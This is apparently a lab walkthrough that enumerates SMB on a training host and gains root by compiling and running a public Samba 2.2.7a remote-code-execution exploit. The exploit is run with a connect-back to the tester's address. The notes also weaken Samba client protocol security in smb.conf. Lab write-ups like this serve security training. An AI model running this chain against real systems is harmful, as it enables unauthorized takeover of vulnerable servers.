Getting a Foothold

Getting a Foothold

# 1. NMAP scans
TCP Connect scan with service detection
`sudo nmap -sV -sT -p- 10.11.1.115`
![2ddf6dbd053c78025fcff512c7bdd66d.png](68484a0368b6417ebb23939e1f54b995.png)

Check for SMB vulnerabilities
`sudo nmap --script smb-vuln* -p 139,445 10.11.1.115`
![d63c4797d0bf998cfbf4924b136ae6ad.png](db2226e8568d47e494b13437af00d40e.png)

# 2. Enumerate hostname
`nmblookup -A 10.11.1.115`
![f162e489ed2509c256c329dad5801dbf.png](7fca558d91ef4fd2832620d5ef2ae641.png)

# 3. List Samba shares
smbmap seems to onlly scan port 445 by default
`smbmap -H 10.11.1.115`
![fa7a131f91e8ece92c3b036d380db443.png](fb3a8246f6f140c0aca17c5876d92df7.png)

Try again, this time explicitly specify port 139
`smbmap -H 10.11.1.115 -P 139`
![737d28f8e9281f66f2c80173429602ad.png](5d6e4b347df44b758e7aa18829ad4bf2.png)

# 4. Some errors will come up when using smbclient. Update smb.conf
## NT_STATUS_CONNECTION_DISCONNECTED
Add the following line to the global settings in smb.conf
`client min protocol = NT1`
![540fd789e228c4845e8cea33539742b4.png](024ca433c13e4ca6854f8ce50d37face.png)

## Require extended security.
Add the following lines to global settings in smb.conf
`client use spnego = no`
`client ntlmv2 auth = no`
![374ea350e368985cc1bfc7d358f5a588.png](45202c46eb244eefa220c81b015a3d6d.png)

Here is what the additions should look like in in smb.conf
`vi /etc/samba/smb.conf`
![89d77f2d85a2e8e7b030fcf3cbf65f78.png](edc035a2d3c348c9993eaa21a7406008.png)

# 5. Restart Samba 
`sudo systemctl restart smbd`

# 6. Now use smbclient to list shares
`echo exit | smbclient -L \\\\10.11.1.115`
![b2f29c37c0f782ee6e911ba73b233480.png](e543646fe4684128b0806d7c2280a010.png)


# 7. Perform an overall scan
Notice that it doesn't show the Samba version for Tophat
`enum4linux -a 10.11.1.115`
[enumlin_output.txt](55563659d2324858b210959f18b80938.txt)
![d6cba43ddad1d94a0be7ab54a55c7c28.png](8d23e94839c34f7e87a21eeae35acd92.png)

# 8. Find Tophat's Samba version
Open Wireshark with filters -> tun0 -> host 10.11.1.115

Then run:
`echo exit | smbclient -L 10.11.1.115`

Wireshark output to get the Samba version of TOPHAT: Unix.Samba 2.2.7a
![0021ca83de94d5269c95480e2e96ddb6.png](c2ff9105a97949e5a9d3a4d303994534.png)

# 8. Searchsploit Samba 2.2.7
`searchsploit samba remote 2.2.7 remote`
![bf7e4c2b46398bdfcb3c38a73b386dfd.png](35ddbbe96d974c1a86678bdcc50d1e47.png)

Download this one: < 2.2.8 (Linux/BSD) - Remote Code Execution 
`searchsploit -m 10`
![ff0d6aff074141c38cb63a6d06b98404.png](99da056a7e734e6c957bf1a1dacaeaf8.png)

# 9. Compile 10.c
gcc 10.c -o exploit
![43fbbda259786300a53ca3b63d63ff0f.png](9622280aa41846a1900b7467f490f862.png)

# 10. Exploit! We are root.
`./exploit -b 1 -c 192.168.119.214 -p 139 -v 10.11.1.115`
![b7dcc30e92ad65094867df6fc8ef1d86.png](e277ccb2023249f6b71343eec300037f.png)

